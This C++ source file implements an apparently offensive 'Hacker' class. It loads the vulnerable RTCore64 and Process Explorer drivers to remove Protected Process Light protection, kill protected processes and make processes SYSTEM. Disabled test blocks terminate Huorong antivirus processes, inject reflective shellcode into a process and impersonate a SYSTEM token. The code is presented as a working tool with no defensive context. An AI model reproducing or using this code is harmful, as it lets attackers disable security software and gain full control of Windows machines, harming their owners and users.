#include "stdafx.h"
#include "ntobj.h"

namespace local {
 Hacker* __gpHacker = nullptr;
 Hacker::Hacker() {
  Init();
 }
 Hacker::~Hacker() {
  UnInit();
 }

 void Hacker::Init() {
  do {

   // Initialize device objects.
   {
    auto pDevice = new device::RTCore();
    if (pDevice->Start() && pDevice->Ready()) {
     m_DeviceObjQ.push(pDevice->Type(), pDevice);
    }
    else {
     pDevice->Stop();
     pDevice->Release();
    }
   }

   {
    auto pDevice = new device::MicrosoftProcexp152();
    if (pDevice->Start() && pDevice->Ready()) {
     m_DeviceObjQ.push(pDevice->Type(), pDevice);
    }
    else {
     pDevice->Stop();
     pDevice->Release();
    }
   }

   //!@ Test ProceXp152 Drive
#if 0
   auto pDrive = new drive::MicrosoftProcexp152();
   pDrive->Start();
   std::vector<std::wstring> hrps = { LR"(HipsTray.exe)",LR"(wsctrlsvc.exe)",LR"(HipsDaemon.exe)",LR"(usysdiag.exe)",LR"(HipsMain.exe)" };
   auto pNtobj = new shared::nt::NTObj();
   std::map<DWORD, shared::nt::ProcessInfo> snapshoots;
   pNtobj->EnumProcessOnce(
    [&](const auto& creations, const auto& deletions, const auto& snapshoot) {
     snapshoots = snapshoot;
    }, true, true, true, true);
   for (const auto& node : snapshoots) {
    if (node.second.Signature.find(LR"(Beijing Huorong Network Technology Co., Ltd.)") != std::wstring::npos) {
     auto hd = pDrive->OpenProcess(node.second.UniqueProcessId);
     auto ret = ::TerminateProcess(hd, 0);
     auto view = 0;
    }
   }
   pDrive->Stop();
   pDrive->Release();
#endif
   //!@ Test RTCore64 Drive
#if 0
   auto pDrive = new device::RTCore();
   pDrive->Start();


   pDrive->MakeSystemProcess(6972);
   //pDrive->ProcessProtectionAction(1128, true, PROTECTION_LEVEL_LSA_LIGHT);
#if 0
   auto pNtObj = new shared::nt::NTObj();
   std::map<DWORD, shared::nt::ProcessInfo> snapshoots;
   pNtObj->EnumProcessOnce(
    [&](const auto& creations, const auto& deletions, const auto& snapshoot) {
     snapshoots = snapshoot;
    }, true, true, true, true);
   for (const auto& node : snapshoots) {
    pDrive->ProcessProtectionAction(node.first, false);
   }
#endif
   pDrive->Stop();
   pDrive->Release();
#endif
#if 0
   DWORD IntegrityLevel = 0;
   shared::Win::Process::GetProcessIntegrityLevel(::GetCurrentProcessId(), IntegrityLevel);

   HANDLE hSystemToken = nullptr;
   shared::Win::EnumProcessHandleByStringSid(L"S-1-5-18",
    [&](const HANDLE& found) {
     hSystemToken = found;
   return false;
    });
   std::string shellcode;
   auto pebuffer = shared::Win::File::Read(R"(D:\__Github__\Windows\bin\x64\Release\MicrosoftWindowPublisherShellCode.dll)");
   shared::injection::Reflecive::GenerateShellcode(pebuffer, "api_object_init", "", shared::injection::EnShellCodeFlag::EN_SC_CLEARHEADER, shellcode);
   shared::Win::ShellcodeExecute(1504, shellcode);
   shared::Win::Impersonate(hSystemToken,
    [&]() {
     auto hWinlogon = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, 664);
   auto sk = 0;
    });
   auto pNtObj = new shared::nt::NTObj();
   std::map<DWORD, shared::nt::ProcessInfo> creations, deletions, snapshoot;
   pNtObj->EnumProcessOnce(
    [&](const auto& creations, const auto& deletions, const auto& snapshoot) {
     auto sk = 0;
    }, true, true, true, true);
   //auto view = std::string((char*)&EventAggregation_dll_res[0], sizeof(EventAggregation_dll_res));
   auto ssss = 0;
#endif
  } while (0);
 }
 void Hacker::UnInit() {
  m_DeviceObjQ.iterate_clear(
   [&](const auto&, auto& pDeviceObj, auto&, auto& itclear) {
    pDeviceObj->Stop();
  pDeviceObj->Release();
  itclear = true;
   });
 }
 bool Hacker::Start() {
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  do {
   if (m_IsOpen.load())
    break;




   m_IsOpen.store(true);
  } while (0);
  return m_IsOpen.load();
 }
 void Hacker::Stop() {
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  do {
   if (!m_IsOpen.load())
    break;



   m_IsOpen.store(false);
  } while (0);
 }
 bool Hacker::Ready() const {
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  return m_IsOpen.load();
 }
 bool Hacker::TerminalProcess(const DWORD& pid) const {
  bool result = false;
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  HANDLE hProcess = nullptr;
  do {
   if (pid <= 4)
    break;
   hProcess = ::OpenProcess(PROCESS_TERMINATE, FALSE, pid);
   if (hProcess && (TRUE == ::TerminateProcess(hProcess, 0))) {
    result = true;
    break;
   }
   if (!hProcess) {
    if (!m_DeviceObjQ.search(device::EnDeviceType::MicrosoftProcexp152,
     [&](const device::IDevice* pDevice) {
      pDevice->OpenProcess(pid, hProcess);
     }))
     break;
   }
   if (!hProcess)
    break;
   //! HasPPL
   DWORD ProcessPPLLevel = 0;
   shared::Win::Process::GetProcessProtectionLevel(pid, ProcessPPLLevel);
   if (ProcessPPLLevel > 0) {
    m_DeviceObjQ.search(device::EnDeviceType::MicroStarRTCore64,
     [&](device::IDevice* pDevice) {
      if (pDevice->ProcessProtectionAction(pid, false)) {
       if (TRUE == ::TerminateProcess(hProcess, 0)) {
        result = true;
       }
      }
     });
    break;
   }
   result = ::TerminateProcess(hProcess, 0) == TRUE;
  } while (0);
  SK_CLOSE_HANDLE(hProcess);
  return result;
 }
 bool Hacker::ProtectionProcess(const DWORD& pid, const DWORD& ProcessSignatureLevel) const {
  bool result = false;
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  do {
   if (pid <= 4)
    break;
   if (!m_DeviceObjQ.search(device::EnDeviceType::MicroStarRTCore64,
    [&](device::IDevice* pDevice) {
     if (pDevice->ProcessProtectionAction(pid, true, ProcessSignatureLevel))
     result = true;
    }))
    break;

  } while (0);
  return result;
 }
 bool Hacker::MakeSystemProcess(const DWORD& pid) const {
  bool result = false;
  std::lock_guard<std::mutex> lock{ *m_Mutex };
  do {
   if (pid == 4)
    break;
   if (!m_DeviceObjQ.search(device::EnDeviceType::MicroStarRTCore64,
    [&](device::IDevice* pDevice) {
     if (pDevice->MakeSystemProcess(pid == 0 ? ::GetCurrentProcessId() : pid))
     result = true;
    }))
    break;
  } while (0);
  return result;
 }

}///namespace local

